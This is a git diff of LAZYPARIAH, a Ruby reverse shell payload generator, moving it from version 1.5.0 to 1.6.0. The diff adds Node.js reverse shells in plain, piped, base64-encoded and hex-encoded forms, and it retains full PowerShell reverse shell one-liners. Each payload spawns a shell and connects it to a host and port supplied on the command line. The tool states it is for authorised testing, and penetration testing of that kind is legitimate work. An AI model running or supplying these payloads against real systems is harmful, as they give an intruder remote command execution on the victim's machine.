@@ -1,7 +1,7 @@
 #!/usr/bin/env ruby
 #
 # Title: LAZYPARIAH
-# Version: 1.5.0
+# Version: 1.6.0
 # Description:
 #	LAZYPARIAH is a simple tool for generating various reverse shell payloads
 #	on the fly. It is intended to be used only in authorised circumstances by
@@ -29,7 +29,7 @@ require "stringio"
 
 # Define constants.
 PROGRAM_NAME = "LAZYPARIAH".freeze()
-PROGRAM_VERSION = "1.5.0".freeze()
+PROGRAM_VERSION = "1.6.0".freeze()
 EXECUTABLE_NAME = "lazypariah".freeze()
 
 # Define payload list.
@@ -67,7 +67,11 @@ PAYLOAD_LIST = [
 	"rust_binary",
 	"nc_openbsd",
 	"powershell_c",
-	"powershell_b64"
+	"powershell_b64",
+	"nodejs",
+	"nodejs_c",
+	"nodejs_b64",
+	"nodejs_hex"
 ].sort()
 
 # Define dictionary of payload aliases for backwards compatibility with versions < 1.0.0.
@@ -521,13 +525,28 @@ begin
 				system("rm -r #{temp_dir}")
 			when "powershell_c"
 				# Simple reverse shell in Powershell.
-				#print_output(s: "powershell -nop -c \"$t = New-Object System.Net.Sockets.TCPClient('#{ARGV[1]}', #{ARGV[2]}); $s = $t.GetStream(); [byte[]]$b = 0..65535|%{0}; while(($i = $s.Read($b, 0, $b.Length)) -ne 0){; $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b, 0, $i); $r = (IEX $d 2>&1 | Out-String); $r2 = $r + 'PS '+(pwd).Path+'> '; $rb = ([text.encoding]::ASCII).GetBytes($r2); $s.Write($rb, 0, $rb.Length); $s.Flush()}; $t.Close();\"", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
 				code = "$client = New-Object System.Net.Sockets.TCPClient('#{ARGV[1]}',#{ARGV[2]});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 				command = "powershell -nop -c \"#{code}\""
 				print_output(s: command, url_encode: url_encode, new_line: !arguments[:"no-new-line"])
 			when "powershell_b64"
+				# Simple base64-encoded reverse shell in Powershell.
 				code = "$client = New-Object System.Net.Sockets.TCPClient('#{ARGV[1]}',#{ARGV[2]});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()".encode("utf-16le")
 				command = "powershell -e #{Base64.strict_encode64(code)}"
+				print_output(s: command, url_encode: url_encode, new_line: !arguments[:"no-new-line"])
+			when "nodejs"
+				code = "(function(){var net = require('net'), cp = require('child_process'), sh = cp.spawn('/bin/sh', []);var client = new net.Socket();client.connect(#{ARGV[2]}, '#{ARGV[1]}', function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();"
+				print_output(s: code, url_encode: url_encode, new_line: !arguments[:"no-new-line"])
+			when "nodejs_c"
+				code = "(function(){var net = require('net'), cp = require('child_process'), sh = cp.spawn('/bin/sh', []);var client = new net.Socket();client.connect(#{ARGV[2]}, '#{ARGV[1]}', function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();"
+				command = "echo \"#{code}\" | node"
+				print_output(s: command, url_encode: url_encode, new_line: !arguments[:"no-new-line"])
+			when "nodejs_b64"
+				code = "(function(){var net = require('net'), cp = require('child_process'), sh = cp.spawn('/bin/sh', []);var client = new net.Socket();client.connect(#{ARGV[2]}, '#{ARGV[1]}', function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();"
+				command = "echo #{Base64.strict_encode64(code)} | base64 -d | node"
+				print_output(s: command, url_encode: url_encode, new_line: !arguments[:"no-new-line"])
+			when "nodejs_hex"
+				code = "(function(){var net = require('net'), cp = require('child_process'), sh = cp.spawn('/bin/sh', []);var client = new net.Socket();client.connect(#{ARGV[2]}, '#{ARGV[1]}', function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();".unpack("H*")[0]
+				command = "echo #{code} | xxd -p -r - | node"
 				print_output(s: command, url_encode: url_encode, new_line: !arguments[:"no-new-line"])
 			end
 		end
